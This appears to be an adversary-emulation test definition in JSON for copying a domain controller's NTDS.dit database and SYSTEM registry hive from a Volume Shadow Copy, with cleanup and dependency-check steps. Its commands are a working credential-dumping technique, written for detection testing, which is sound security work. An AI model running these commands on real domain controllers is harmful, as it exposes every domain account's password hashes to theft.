{
  "id": "c6237146-9ea6-4711-85c9-c56d263a6b03",
  "name": "Copy NTDS.dit from Volume Shadow Copy",
  "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n\nThis test requires steps taken in the test \"Create Volume Shadow Copy with vssadmin\".\nA successful test also requires the export of the SYSTEM Registry hive.\nThis test must be executed on a Windows Domain Controller.\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "4916e894-a355-4849-b0e5-c0c851f15752",
      "type": "execute-command",
      "data": {
        "command": "copy #{vsc_name}\\Windows\\NTDS\\NTDS.dit #{extract_path}\\ntds.dit\ncopy #{vsc_name}\\Windows\\System32\\config\\SYSTEM #{extract_path}\\VSC_SYSTEM_HIVE\nreg save HKLM\\SYSTEM #{extract_path}\\SYSTEM_HIVE",
        "command_type": "command_prompt"
      },
      "elevation_required": true
    },
    {
      "id": "94292758-38d5-495c-8d6c-c42de15a51ba",
      "type": "execute-command",
      "data": {
        "command": "del \"#{extract_path}\\ntds.dit\"        \u003enul 2\u003e nul\ndel \"#{extract_path}\\VSC_SYSTEM_HIVE\" \u003enul 2\u003e nul\ndel \"#{extract_path}\\SYSTEM_HIVE\"     \u003enul 2\u003e nul",
        "command_type": "command_prompt"
      },
      "elevation_required": true
    },
    {
      "id": "f2da8a4b-3f1c-441c-9a0a-2b91c607f991",
      "name": "Check dependency 1/3",
      "description": "Target must be a Domain Controller\n",
      "type": "execute-command",
      "data": {
        "command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  /v ProductType | findstr LanmanNT",
        "command_type": "command_prompt"
      },
      "elevation_required": true
    },
    {
      "id": "48500ad1-7996-46be-8d57-ef1d8c1d3d08",
      "name": "Resolve dependency 1/3",
      "description": "Target must be a Domain Controller\n",
      "type": "execute-command",
      "data": {
        "command": "echo Sorry, Promoting this machine to a Domain Controller must be done manually",
        "command_type": "command_prompt"
      },
      "elevation_required": true
    },
    {
      "id": "74ed5eb6-81a3-4d5d-8c5d-1a1dd9fe311c",
      "name": "Re-check dependency 1/3",
      "description": "Target must be a Domain Controller\n",
      "type": "execute-command",
      "data": {
        "command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  /v ProductType | findstr LanmanNT",
        "command_type": "command_prompt"
      },
      "elevation_required": true
    },
    {
      "id": "5beaa679-d85b-4d53-a6c8-900ba5ec61e9",
      "name": "Check dependency 2/3",
      "description": "Volume shadow copy must exist\n",
      "type": "execute-command",
      "data": {
        "command": "if not exist #{vsc_name} (exit /b 1)",
        "command_type": "command_prompt"
      },
      "elevation_required": true
    },
    {
      "id": "49365ca2-fc03-48b1-93b7-185518bfb6ad",
      "name": "Resolve dependency 2/3",
      "description": "Volume shadow copy must exist\n",
      "type": "execute-command",
      "data": {
        "command": "echo Run \"Invoke-AtomicTest T1003.003 -TestName 'Create Volume Shadow Copy with vssadmin'\" to fulfill this requirement",
        "command_type": "command_prompt"
      },
      "elevation_required": true
    },
    {
      "id": "ada7d6b8-0220-49c1-a92b-504ddfbb3f08",
      "name": "Re-check dependency 2/3",
      "description": "Volume shadow copy must exist\n",
      "type": "execute-command",
      "data": {
        "command": "if not exist #{vsc_name} (exit /b 1)",
        "command_type": "command_prompt"
      },
      "elevation_required": true
    },
    {
      "id": "e6d5383e-5433-44b2-a9e6-17a3aa9ea08d",
      "name": "Check dependency 3/3",
      "description": "Extract path must exist\n",
      "type": "execute-command",
      "data": {
        "command": "if not exist #{extract_path} (exit /b 1)",
        "command_type": "command_prompt"
      },
      "elevation_required": true
    },
    {
      "id": "ee3ee4e5-e3a8-4687-a022-fc2e8b9b853c",
      "name": "Resolve dependency 3/3",
      "description": "Extract path must exist\n",
      "type": "execute-command",
      "data": {
        "command": "mkdir #{extract_path}",
        "command_type": "command_prompt"
      },
      "elevation_required": true
    },
    {
      "id": "fa653a6c-8d16-4e64-a628-c0ae6b0b2625",
      "name": "Re-check dependency 3/3",
      "description": "Extract path must exist\n",
      "type": "execute-command",
      "data": {
        "command": "if not exist #{extract_path} (exit /b 1)",
        "command_type": "command_prompt"
      },
      "elevation_required": true
    }
  ],
  "flows": [
    {
      "s": "4916e894-a355-4849-b0e5-c0c851f15752",
      "p": "on-success",
      "o": "94292758-38d5-495c-8d6c-c42de15a51ba"
    },
    {
      "s": "4916e894-a355-4849-b0e5-c0c851f15752",
      "p": "on-failure",
      "o": "94292758-38d5-495c-8d6c-c42de15a51ba"
    },
    {
      "s": "f2da8a4b-3f1c-441c-9a0a-2b91c607f991",
      "p": "on-success",
      "o": "4916e894-a355-4849-b0e5-c0c851f15752"
    },
    {
      "s": "f2da8a4b-3f1c-441c-9a0a-2b91c607f991",
      "p": "on-failure",
      "o": "48500ad1-7996-46be-8d57-ef1d8c1d3d08"
    },
    {
      "s": "48500ad1-7996-46be-8d57-ef1d8c1d3d08",
      "p": "on-success",
      "o": "74ed5eb6-81a3-4d5d-8c5d-1a1dd9fe311c"
    },
    {
      "s": "74ed5eb6-81a3-4d5d-8c5d-1a1dd9fe311c",
      "p": "on-failure",
      "o": "4916e894-a355-4849-b0e5-c0c851f15752"
    },
    {
      "s": "5beaa679-d85b-4d53-a6c8-900ba5ec61e9",
      "p": "on-success",
      "o": "4916e894-a355-4849-b0e5-c0c851f15752"
    },
    {
      "s": "5beaa679-d85b-4d53-a6c8-900ba5ec61e9",
      "p": "on-failure",
      "o": "49365ca2-fc03-48b1-93b7-185518bfb6ad"
    },
    {
      "s": "49365ca2-fc03-48b1-93b7-185518bfb6ad",
      "p": "on-success",
      "o": "ada7d6b8-0220-49c1-a92b-504ddfbb3f08"
    },
    {
      "s": "ada7d6b8-0220-49c1-a92b-504ddfbb3f08",
      "p": "on-failure",
      "o": "4916e894-a355-4849-b0e5-c0c851f15752"
    },
    {
      "s": "e6d5383e-5433-44b2-a9e6-17a3aa9ea08d",
      "p": "on-success",
      "o": "4916e894-a355-4849-b0e5-c0c851f15752"
    },
    {
      "s": "e6d5383e-5433-44b2-a9e6-17a3aa9ea08d",
      "p": "on-failure",
      "o": "ee3ee4e5-e3a8-4687-a022-fc2e8b9b853c"
    },
    {
      "s": "ee3ee4e5-e3a8-4687-a022-fc2e8b9b853c",
      "p": "on-success",
      "o": "fa653a6c-8d16-4e64-a628-c0ae6b0b2625"
    },
    {
      "s": "fa653a6c-8d16-4e64-a628-c0ae6b0b2625",
      "p": "on-failure",
      "o": "4916e894-a355-4849-b0e5-c0c851f15752"
    }
  ],
  "tags": [
    "T1003",
    "T1003.003"
  ],
  "input_arguments": [
    {
      "name": "extract_path",
      "type": "path",
      "description": "Path for extracted NTDS.dit",
      "value": "C:\\Windows\\Temp"
    },
    {
      "name": "vsc_name",
      "type": "string",
      "description": "Name of Volume Shadow Copy",
      "value": "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1"
    }
  ]
}